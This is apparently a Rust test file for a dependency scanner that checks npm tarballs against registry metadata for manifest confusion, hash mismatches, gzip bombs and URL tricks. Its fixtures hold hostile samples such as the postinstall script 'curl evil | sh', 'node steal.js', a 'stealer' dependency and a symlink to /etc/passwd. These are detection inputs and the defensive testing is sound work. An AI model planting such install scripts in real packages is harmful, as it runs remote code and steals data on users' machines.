//! Tarball verification against the packument (manifest confusion). All
//! fixtures are built in memory; network tests use a local 127.0.0.1 server.

use super::*;
use crate::registry::RegistryMetadata;
use crate::registry::npm_tarball::*;
use serde_json::json;
use std::collections::HashMap;
use std::io::Write;
use std::sync::{Arc, Mutex};

// ── fixtures ──

enum Entry<'a> {
    File(&'a str, &'a [u8]),
    Symlink(&'a str, &'a str),
    /// A single 512-byte zero block (node-tar keeps reading after one).
    ZeroBlock,
}

fn tar_bytes(entries: &[Entry]) -> Vec<u8> {
    let mut out = Vec::new();
    for entry in entries {
        match entry {
            Entry::File(path, data) => {
                let mut header = tar::Header::new_gnu();
                header.set_path(path).unwrap();
                header.set_size(data.len() as u64);
                header.set_mode(0o644);
                header.set_entry_type(tar::EntryType::Regular);
                header.set_cksum();
                out.extend_from_slice(header.as_bytes());
                out.extend_from_slice(data);
                out.resize(out.len().div_ceil(512) * 512, 0);
            }
            Entry::Symlink(path, target) => {
                let mut header = tar::Header::new_gnu();
                header.set_path(path).unwrap();
                header.set_size(0);
                header.set_entry_type(tar::EntryType::Symlink);
                header.set_link_name(target).unwrap();
                header.set_cksum();
                out.extend_from_slice(header.as_bytes());
            }
            Entry::ZeroBlock => out.extend_from_slice(&[0u8; 512]),
        }
    }
    out.extend_from_slice(&[0u8; 1024]);
    out
}

fn gzip(bytes: &[u8]) -> Vec<u8> {
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    encoder.write_all(bytes).unwrap();
    encoder.finish().unwrap()
}

fn tgz(entries: &[Entry]) -> Vec<u8> {
    gzip(&tar_bytes(entries))
}

fn package_tgz(package_json: &serde_json::Value) -> Vec<u8> {
    let manifest = package_json.to_string();
    tgz(&[
        Entry::File("package/package.json", manifest.as_bytes()),
        Entry::File("package/index.js", b"module.exports = 1;\n"),
    ])
}

fn sri_sha512(bytes: &[u8]) -> String {
    use sha2::Digest;
    format!("sha512-{}", base64_encode(&sha2::Sha512::digest(bytes)))
}

fn clean_manifest() -> serde_json::Value {
    json!({
        "name": "left-pad", "version": "1.0.0",
        "scripts": {"test": "jest"},
        "dependencies": {"a": "^1.0.0"}
    })
}

fn facts(json: serde_json::Value) -> NpmManifestFacts {
    read_tarball_manifest(&package_tgz(&json), &TarballLimits::default()).unwrap()
}

// ── pure helpers ──

#[test]
fn sha1_matches_fips_vectors() {
    assert_eq!(hex(&sha1(b"")), "da39a3ee5e6b4b0d3255bfef95601890afd80709");
    assert_eq!(
        hex(&sha1(b"abc")),
        "a9993e364706816aba3e25717850c26c9cd0d89d"
    );
    assert_eq!(
        hex(&sha1(
            b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"
        )),
        "84983e441c3bd26ebaae4aa1f95129e5e54670f1"
    );
    assert_eq!(
        hex(&sha1(&vec![b'a'; 1_000_000])),
        "34aa973cd4c4daa4f61eeb2bdbad27316534016f"
    );
}

#[test]
fn base64_matches_rfc4648_vectors() {
    for (input, expected) in [
        ("", ""),
        ("f", "Zg=="),
        ("fo", "Zm8="),
        ("foo", "Zm9v"),
        ("foob", "Zm9vYg=="),
        ("fooba", "Zm9vYmE="),
        ("foobar", "Zm9vYmFy"),
    ] {
        assert_eq!(base64_encode(input.as_bytes()), expected);
    }
}

#[test]
fn integrity_accepts_matching_sha512_and_rejects_mismatch() {
    let bytes = b"tarball bytes";
    assert!(verify_integrity(bytes, Some(&sri_sha512(bytes)), None).is_ok());
    let err = verify_integrity(bytes, Some(&sri_sha512(b"other")), None).unwrap_err();
    assert!(err.downcast_ref::<IntegrityMismatch>().is_some(), "{err}");
}

#[test]
fn integrity_uses_strongest_algorithm_present() {
    let bytes = b"tarball bytes";
    // A matching weak hash must not rescue a mismatching sha512.
    let integrity = format!(
        "sha1-{} {}",
        base64_encode(&sha1(bytes)),
        sri_sha512(b"forged")
    );
    let err = verify_integrity(bytes, Some(&integrity), None).unwrap_err();
    assert!(err.downcast_ref::<IntegrityMismatch>().is_some(), "{err}");
}

#[test]
fn integrity_falls_back_to_shasum() {
    let bytes = b"legacy tarball";
    let shasum = hex(&sha1(bytes));
    assert!(verify_integrity(bytes, None, Some(&shasum)).is_ok());
    let err = verify_integrity(bytes, None, Some(&hex(&sha1(b"x")))).unwrap_err();
    assert!(err.downcast_ref::<IntegrityMismatch>().is_some(), "{err}");
}

#[test]
fn missing_or_unusable_hash_is_an_error_not_a_pass() {
    let bytes = b"tarball";
    assert!(verify_integrity(bytes, None, None).is_err());
    assert!(verify_integrity(bytes, Some("md5-abc"), None).is_err());
    assert!(verify_integrity(bytes, None, Some("not-hex")).is_err());
}

#[test]
fn tarball_url_must_be_same_origin_https_without_credentials() {
    let origin = reqwest::Url::parse("https://registry.npmjs.org").unwrap();
    let ok = "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz";
    assert!(validate_tarball_url(ok, &origin, "left-pad").is_ok());
    assert!(
        validate_tarball_url(
            "https://registry.npmjs.org/@scope/pkg/-/pkg-1.0.0.tgz",
            &origin,
            "@scope/pkg"
        )
        .is_ok()
    );
    for bad in [
        "http://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz",
        "https://evil.example/left-pad/-/left-pad-1.0.0.tgz",
        "https://registry.npmjs.org.evil.example/left-pad/-/left-pad-1.0.0.tgz",
        "https://user:pass@registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz",
        "https://registry.npmjs.org@evil.example/left-pad/-/left-pad-1.0.0.tgz",
        "https://registry.npmjs.org:8443/left-pad/-/left-pad-1.0.0.tgz",
        "https://registry.npmjs.org/other-pkg/-/other-pkg-1.0.0.tgz",
        "https://registry.npmjs.org/left-pad/-/../../other/-/x.tgz",
        "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz?x=1",
        "https://registry.npmjs.org/left-pad/-/sub/left-pad-1.0.0.tgz",
        "ftp://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz",
        "not a url",
    ] {
        assert!(
            validate_tarball_url(bad, &origin, "left-pad").is_err(),
            "accepted {bad}"
        );
    }
}

#[test]
fn tarball_facts_read_scripts_and_dependency_union() {
    let actual = facts(json!({
        "scripts": {"postinstall": "node ./x.js", "test": "jest", "prepare": 3},
        "dependencies": {"a": "1"},
        "optionalDependencies": {"b": "1"}
    }));
    assert_eq!(
        actual.install_scripts,
        [("postinstall".to_string(), "node ./x.js".to_string())].into()
    );
    assert_eq!(
        actual.dependencies,
        ["a".to_string(), "b".to_string()].into()
    );
    assert!(actual.has_install_scripts());
}

#[test]
fn root_gyp_file_implies_node_gyp_install_like_npm() {
    let manifest = json!({"name": "native"}).to_string();
    let bytes = tgz(&[
        Entry::File("package/package.json", manifest.as_bytes()),
        Entry::File("package/binding.gyp", b"{}"),
    ]);
    let actual = read_tarball_manifest(&bytes, &TarballLimits::default()).unwrap();
    assert!(actual.gyp);
    assert_eq!(
        actual.install_scripts.get("install").map(String::as_str),
        Some(NODE_GYP_REBUILD)
    );
    // The packument npm publishes for it is consistent.
    let declared = declared_facts(&json!({
        "gypfile": true, "scripts": {"install": "node-gyp rebuild"}
    }));
    assert!(compare_facts(&declared, &actual).is_empty());
    // A packument hiding the native build is not.
    assert!(!compare_facts(&declared_facts(&json!({})), &actual).is_empty());
}

#[test]
fn script_path_prefix_is_normalised_like_npm_publish() {
    let actual = facts(json!({"scripts": {"postinstall": "node_modules/.bin/husky install"}}));
    let declared = declared_facts(&json!({"scripts": {"postinstall": "husky install"}}));
    assert!(compare_facts(&declared, &actual).is_empty());
}

#[test]
fn optional_dependency_normalisation_is_not_a_mismatch() {
    let actual = facts(json!({"dependencies": {"a": "1"}, "optionalDependencies": {"b": "1"}}));
    // Older npm copies optional deps into dependencies; newer npm dedupes.
    for declared in [
        json!({"dependencies": {"a": "1", "b": "1"}, "optionalDependencies": {"b": "1"}}),
        json!({"dependencies": {"a": "1"}, "optionalDependencies": {"b": "1"}}),
    ] {
        assert!(compare_facts(&declared_facts(&declared), &actual).is_empty());
    }
}

#[test]
fn hidden_postinstall_and_hidden_dependency_are_reported() {
    let actual = facts(json!({
        "scripts": {"postinstall": "curl evil | sh"},
        "dependencies": {"a": "1", "stealer": "1"}
    }));
    let declared = declared_facts(&json!({"scripts": {}, "dependencies": {"a": "1"}}));
    let differences = compare_facts(&declared, &actual);
    assert!(
        differences.iter().any(|d| d.contains("postinstall")),
        "{differences:?}"
    );
    assert!(
        differences.iter().any(|d| d.contains("'stealer'")),
        "{differences:?}"
    );
}

#[test]
fn changed_script_body_is_reported() {
    let actual = facts(json!({"scripts": {"install": "node evil.js"}}));
    let declared = declared_facts(&json!({"scripts": {"install": "node-gyp rebuild"}}));
    assert_eq!(compare_facts(&declared, &actual).len(), 1);
}

#[test]
fn missing_package_json_is_an_error() {
    let bytes = tgz(&[Entry::File("package/index.js", b"1")]);
    let err = read_tarball_manifest(&bytes, &TarballLimits::default()).unwrap_err();
    assert!(err.to_string().contains("package.json"), "{err}");
}

#[test]
fn top_level_dir_name_does_not_matter_but_root_files_are_dropped() {
    // npm extracts with strip: 1, so any first component works...
    let manifest = clean_manifest().to_string();
    let bytes = tgz(&[Entry::File(
        "node-left-pad/package.json",
        manifest.as_bytes(),
    )]);
    assert!(read_tarball_manifest(&bytes, &TarballLimits::default()).is_ok());
    // ...and an archive-root package.json is dropped by extraction.
    let bytes = tgz(&[Entry::File("package.json", manifest.as_bytes())]);
    assert!(read_tarball_manifest(&bytes, &TarballLimits::default()).is_err());
}

#[test]
fn duplicate_package_json_is_an_error() {
    let clean = clean_manifest().to_string();
    let evil = json!({"scripts": {"postinstall": "evil"}}).to_string();
    for bytes in [
        tgz(&[
            Entry::File("package/package.json", clean.as_bytes()),
            Entry::File("package/package.json", evil.as_bytes()),
        ]),
        // Case-insensitive file systems overwrite the first with the second.
        tgz(&[
            Entry::File("package/package.json", clean.as_bytes()),
            Entry::File("package/PACKAGE.JSON", evil.as_bytes()),
        ]),
        // After a single zero block node-tar keeps extracting.
        tgz(&[
            Entry::File("package/package.json", clean.as_bytes()),
            Entry::ZeroBlock,
            Entry::File("package/package.json", evil.as_bytes()),
        ]),
    ] {
        let err = read_tarball_manifest(&bytes, &TarballLimits::default()).unwrap_err();
        assert!(err.to_string().contains("more than one"), "{err}");
    }
}

#[test]
fn concatenated_gzip_members_are_read() {
    // Node's gunzip decodes every gzip member; the second must not be hidden.
    let clean = clean_manifest().to_string();
    let evil = json!({"scripts": {"postinstall": "evil"}}).to_string();
    let mut first = tar_bytes(&[Entry::File("package/package.json", clean.as_bytes())]);
    first.truncate(first.len() - 1024); // no end-of-archive marker
    let mut bytes = gzip(&first);
    bytes.extend(gzip(&tar_bytes(&[Entry::File(
        "package/package.json",
        evil.as_bytes(),
    )])));
    assert!(read_tarball_manifest(&bytes, &TarballLimits::default()).is_err());
}

#[test]
fn non_regular_package_json_is_an_error() {
    let bytes = tgz(&[Entry::Symlink("package/package.json", "/etc/passwd")]);
    assert!(read_tarball_manifest(&bytes, &TarballLimits::default()).is_err());
}

#[test]
fn gzip_bomb_is_rejected() {
    let big = vec![0u8; 8 * 1024 * 1024];
    let manifest = clean_manifest().to_string();
    let bytes = tgz(&[
        Entry::File("package/package.json", manifest.as_bytes()),
        Entry::File("package/bomb.bin", &big),
    ]);
    assert!(bytes.len() < 64 * 1024, "fixture should compress well");
    let limits = TarballLimits {
        max_decompressed_bytes: 1024 * 1024,
        ..TarballLimits::default()
    };
    let err = read_tarball_manifest(&bytes, &limits).unwrap_err();
    assert!(
        err.to_string().contains("decompresses to more than"),
        "{err}"
    );
}

#[test]
fn entry_count_limit_is_enforced() {
    let manifest = clean_manifest().to_string();
    let names: Vec<String> = (0..20).map(|i| format!("package/f{i}.js")).collect();
    let mut entries = vec![Entry::File("package/package.json", manifest.as_bytes())];
    entries.extend(names.iter().map(|n| Entry::File(n, b"1")));
    let limits = TarballLimits {
        max_entries: 10,
        ..TarballLimits::default()
    };
    let err = read_tarball_manifest(&tgz(&entries), &limits).unwrap_err();
    assert!(err.to_string().contains("entries"), "{err}");
}

#[test]
fn oversized_package_json_is_rejected() {
    let manifest = json!({"description": "x".repeat(4096)}).to_string();
    let bytes = tgz(&[Entry::File("package/package.json", manifest.as_bytes())]);
    let limits = TarballLimits {
        max_manifest_bytes: 1024,
        ..TarballLimits::default()
    };
    assert!(read_tarball_manifest(&bytes, &limits).is_err());
}

#[test]
fn garbage_is_rejected() {
    assert!(read_tarball_manifest(b"not gzip at all", &TarballLimits::default()).is_err());
}

// ── local mock registry ──

#[derive(Clone)]
struct Route {
    status: u16,
    headers: Vec<(String, String)>,
    body: Vec<u8>,
}

fn ok(body: Vec<u8>) -> Route {
    Route {
        status: 200,
        headers: vec![],
        body,
    }
}

struct MockServer {
    origin: String,
    requests: Arc<Mutex<Vec<String>>>,
}

async fn mock_server(routes: HashMap<String, Route>) -> MockServer {
    mock_server_with(|_| routes).await
}

/// Mock server whose routes may embed its own origin (e.g. a packument's
/// `dist.tarball`).
async fn mock_server_with(build: impl FnOnce(&str) -> HashMap<String, Route>) -> MockServer {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let origin = format!("http://{}", listener.local_addr().unwrap());
    let routes = build(&origin);
    let requests = Arc::new(Mutex::new(Vec::new()));
    let seen = requests.clone();
    tokio::spawn(async move {
        loop {
            let Ok((mut stream, _)) = listener.accept().await else {
                return;
            };
            let routes = routes.clone();
            let seen = seen.clone();
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut buf = [0u8; 4096];
                while !request.windows(4).any(|w| w == b"\r\n\r\n") {
                    let Ok(n) = stream.read(&mut buf).await else {
                        return;
                    };
                    if n == 0 {
                        return;
                    }
                    request.extend_from_slice(&buf[..n]);
                }
                let line = String::from_utf8_lossy(&request)
                    .lines()
                    .next()
                    .unwrap_or("")
                    .to_string();
                let path = line.split_whitespace().nth(1).unwrap_or("").to_string();
                seen.lock().unwrap().push(path.clone());
                let route = routes.get(&path).cloned().unwrap_or(Route {
                    status: 404,
                    headers: vec![],
                    body: b"{}".to_vec(),
                });
                let mut head = format!(
                    "HTTP/1.1 {} X\r\nContent-Length: {}\r\nConnection: close\r\n",
                    route.status,
                    route.body.len()
                );
                for (k, v) in &route.headers {
                    head.push_str(&format!("{k}: {v}\r\n"));
                }
                head.push_str("\r\n");
                let _ = stream.write_all(head.as_bytes()).await;
                let _ = stream.write_all(&route.body).await;
            });
        }
    });
    MockServer { origin, requests }
}

fn test_registry(origin: &str, limits: TarballLimits) -> NpmRegistry {
    NpmRegistry::for_test(origin, limits)
}

fn tarball_ref(
    origin: &str,
    integrity: Option<String>,
    declared: serde_json::Value,
) -> NpmTarballRef {
    NpmTarballRef {
        version: "1.0.0".into(),
        tarball: Some(format!("{origin}/left-pad/-/left-pad-1.0.0.tgz")),
        integrity,
        shasum: None,
        declared: declared_facts(&declared),
    }
}

const TARBALL_PATH: &str = "/left-pad/-/left-pad-1.0.0.tgz";

#[tokio::test]
async fn matching_tarball_is_verified_and_read() {
    let bytes = package_tgz(&clean_manifest());
    let server = mock_server([(TARBALL_PATH.to_string(), ok(bytes.clone()))].into()).await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    let reference = tarball_ref(&server.origin, Some(sri_sha512(&bytes)), clean_manifest());
    let facts = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap()
        .expect("npm registry verifies tarballs");
    assert!(compare_facts(&reference.declared, &facts).is_empty());
    assert!(!facts.has_install_scripts());
}

#[tokio::test]
async fn hidden_postinstall_is_read_from_tarball() {
    let mut evil = clean_manifest();
    evil["scripts"]["postinstall"] = json!("node steal.js");
    let bytes = package_tgz(&evil);
    let server = mock_server([(TARBALL_PATH.to_string(), ok(bytes.clone()))].into()).await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    // Forged-but-consistent packument: correct hash, scripts scrubbed.
    let reference = tarball_ref(&server.origin, Some(sri_sha512(&bytes)), clean_manifest());
    let facts = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap()
        .unwrap();
    assert!(facts.has_install_scripts());
    assert!(!compare_facts(&reference.declared, &facts).is_empty());
}

#[tokio::test]
async fn integrity_mismatch_over_network_is_an_integrity_error() {
    let bytes = package_tgz(&clean_manifest());
    let server = mock_server([(TARBALL_PATH.to_string(), ok(bytes))].into()).await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    let reference = tarball_ref(
        &server.origin,
        Some(sri_sha512(b"different")),
        clean_manifest(),
    );
    let err = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap_err();
    assert!(err.downcast_ref::<IntegrityMismatch>().is_some(), "{err}");
}

#[tokio::test]
async fn oversize_tarball_is_rejected() {
    let bytes = package_tgz(&json!({"description": "y".repeat(20_000)}));
    let server = mock_server([(TARBALL_PATH.to_string(), ok(bytes.clone()))].into()).await;
    let limits = TarballLimits {
        max_compressed_bytes: 64,
        ..TarballLimits::default()
    };
    let registry = test_registry(&server.origin, limits);
    let reference = tarball_ref(&server.origin, Some(sri_sha512(&bytes)), clean_manifest());
    let err = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("larger than"), "{err}");
}

#[tokio::test]
async fn cross_host_tarball_is_rejected_without_a_request() {
    let server = mock_server(HashMap::new()).await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    let mut reference = tarball_ref(&server.origin, Some(sri_sha512(b"x")), clean_manifest());
    reference.tarball = Some("http://localhost:9/left-pad/-/left-pad-1.0.0.tgz".into());
    let err = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap_err();
    assert!(
        err.to_string().contains("not on the registry host"),
        "{err}"
    );
    assert!(server.requests.lock().unwrap().is_empty());
}

#[tokio::test]
async fn redirect_is_not_followed() {
    let bytes = package_tgz(&clean_manifest());
    let server = mock_server(
        [
            (
                TARBALL_PATH.to_string(),
                Route {
                    status: 302,
                    headers: vec![("Location".into(), "/left-pad/-/real.tgz".into())],
                    body: vec![],
                },
            ),
            ("/left-pad/-/real.tgz".to_string(), ok(bytes.clone())),
        ]
        .into(),
    )
    .await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    let reference = tarball_ref(&server.origin, Some(sri_sha512(&bytes)), clean_manifest());
    let err = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("redirect"), "{err}");
    assert_eq!(
        *server.requests.lock().unwrap(),
        vec![TARBALL_PATH.to_string()]
    );
}

#[tokio::test]
async fn fetch_failure_is_an_error() {
    let server = mock_server(HashMap::new()).await; // every path is 404
    let registry = test_registry(&server.origin, TarballLimits::default());
    let reference = tarball_ref(&server.origin, Some(sri_sha512(b"x")), clean_manifest());
    let err = registry
        .verify_npm_tarball("left-pad", &reference)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("HTTP 404"), "{err}");

    // Nothing listening at all.
    let dead = {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        format!("http://{}", listener.local_addr().unwrap())
    };
    let registry = test_registry(&dead, TarballLimits::default());
    let reference = tarball_ref(&dead, Some(sri_sha512(b"x")), clean_manifest());
    assert!(
        registry
            .verify_npm_tarball("left-pad", &reference)
            .await
            .is_err()
    );
}

#[tokio::test]
async fn missing_tarball_url_is_an_error() {
    let registry = test_registry("http://127.0.0.1:9", TarballLimits::default());
    let mut reference = tarball_ref(
        "http://127.0.0.1:9",
        Some(sri_sha512(b"x")),
        clean_manifest(),
    );
    reference.tarball = None;
    assert!(
        registry
            .verify_npm_tarball("left-pad", &reference)
            .await
            .is_err()
    );
}

#[tokio::test]
async fn invalid_package_name_is_rejected_before_any_request() {
    let server = mock_server(HashMap::new()).await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    let reference = tarball_ref(&server.origin, Some(sri_sha512(b"x")), clean_manifest());
    assert!(
        registry
            .verify_npm_tarball("../etc", &reference)
            .await
            .is_err()
    );
    assert!(server.requests.lock().unwrap().is_empty());
}

#[test]
fn packument_exposes_tarball_reference_for_selected_version() {
    let body = json!({
        "time": {"created": "2020-01-01T00:00:00Z", "1.0.0": "2020-01-02T00:00:00Z"},
        "dist-tags": {"latest": "1.0.0"},
        "versions": {"1.0.0": {
            "scripts": {"postinstall": "node x"},
            "dependencies": {"a": "1"},
            "optionalDependencies": {"b": "1"},
            "dist": {
                "tarball": "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz",
                "integrity": "sha512-abc",
                "shasum": "0123"
            }
        }}
    });
    let meta = metadata_from_body(&body, Some("1.0.0")).unwrap();
    let reference = meta.npm_tarball.expect("tarball reference");
    assert_eq!(reference.version, "1.0.0");
    assert_eq!(
        reference.tarball.as_deref(),
        Some("https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz")
    );
    assert_eq!(reference.integrity.as_deref(), Some("sha512-abc"));
    assert_eq!(reference.shasum.as_deref(), Some("0123"));
    assert!(
        reference
            .declared
            .install_scripts
            .contains_key("postinstall")
    );
    // Dependency count covers dependencies and optionalDependencies.
    assert_eq!(meta.dependency_count, Some(2));
}

#[test]
fn production_registry_urls_are_unchanged() {
    let registry = NpmRegistry::new();
    assert_eq!(
        registry.packument_url("@scope/pkg"),
        "https://registry.npmjs.org/@scope/pkg"
    );
    assert_eq!(registry.origin.as_str(), "https://registry.npmjs.org/");
    assert_eq!(
        registry.downloads_base,
        "https://api.npmjs.org/downloads/point/last-month"
    );
}

// ── end to end: the real NpmRegistry and metadata check against the mock ──

/// A brand-new, low-download package whose packument is clean and
/// consistent (correct integrity) whatever the tarball contains.
fn forged_packument(origin: &str, integrity: &str) -> serde_json::Value {
    let now = crate::cache::now_iso8601();
    json!({
        "name": "left-pad",
        "time": {"created": now, "modified": now, "1.0.0": now},
        "dist-tags": {"latest": "1.0.0"},
        "repository": {"url": "https://github.com/acme/left-pad"},
        "versions": {"1.0.0": {
            "name": "left-pad", "version": "1.0.0",
            "scripts": {"test": "jest"},
            "dependencies": {"a": "^1.0.0"},
            "_npmUser": {"name": "mallory"},
            "dist": {"tarball": format!("{origin}{TARBALL_PATH}"), "integrity": integrity}
        }}
    })
}

async fn scan_npm(tarball_manifest: serde_json::Value) -> (Vec<crate::report::Issue>, Vec<String>) {
    let bytes = package_tgz(&tarball_manifest);
    let integrity = sri_sha512(&bytes);
    let server = mock_server_with(|origin| {
        [
            (
                "/left-pad".to_string(),
                ok(forged_packument(origin, &integrity)
                    .to_string()
                    .into_bytes()),
            ),
            (
                "/downloads/left-pad".to_string(),
                ok(br#"{"downloads": 5}"#.to_vec()),
            ),
            (TARBALL_PATH.to_string(), ok(bytes)),
        ]
        .into()
    })
    .await;
    let registry = test_registry(&server.origin, TarballLimits::default());
    let deps = vec![crate::test_helpers::dep_with(
        "left-pad",
        Some("1.0.0"),
        crate::Ecosystem::Npm,
    )];
    let issues = crate::checks::metadata::check_metadata(
        &registry,
        &deps,
        &crate::config::SloppyJoeConfig::default(),
        &std::collections::HashSet::new(),
        &crate::lockfiles::ResolutionResult::default(),
    )
    .await
    .unwrap();
    let requests = server.requests.lock().unwrap().clone();
    (issues, requests)
}

#[tokio::test]
async fn end_to_end_hidden_postinstall_is_blocked() {
    let mut evil = clean_manifest();
    evil["scripts"]["postinstall"] = json!("node steal.js");
    let (issues, requests) = scan_npm(evil).await;
    assert!(requests.contains(&TARBALL_PATH.to_string()), "{requests:?}");
    let checks: Vec<_> = issues.iter().map(|i| i.check.as_str()).collect();
    let inconsistency = issues
        .iter()
        .find(|i| i.check == crate::names::METADATA_MANIFEST_INCONSISTENCY)
        .unwrap_or_else(|| panic!("{checks:?}"));
    assert_eq!(inconsistency.severity, crate::report::Severity::Error);
    // Tarball truth drives the install-script risk signal.
    assert!(
        checks.contains(&crate::names::METADATA_INSTALL_SCRIPT_RISK),
        "{checks:?}"
    );
}

#[tokio::test]
async fn end_to_end_matching_tarball_raises_no_tarball_issue() {
    let (issues, requests) = scan_npm(clean_manifest()).await;
    assert!(requests.contains(&TARBALL_PATH.to_string()), "{requests:?}");
    let checks: Vec<_> = issues.iter().map(|i| i.check.as_str()).collect();
    for check in [
        crate::names::METADATA_MANIFEST_INCONSISTENCY,
        crate::names::METADATA_TARBALL_UNVERIFIED,
        crate::names::METADATA_TARBALL_INTEGRITY,
        crate::names::METADATA_INSTALL_SCRIPT_RISK,
    ] {
        assert!(!checks.contains(&check), "{checks:?}");
    }
}

#[test]
fn long_script_bodies_are_truncated_in_differences() {
    let actual = facts(json!({"scripts": {"postinstall": "x".repeat(100_000)}}));
    let differences = compare_facts(&declared_facts(&json!({})), &actual);
    assert_eq!(differences.len(), 1);
    assert!(differences[0].len() < 600, "{}", differences[0].len());
}
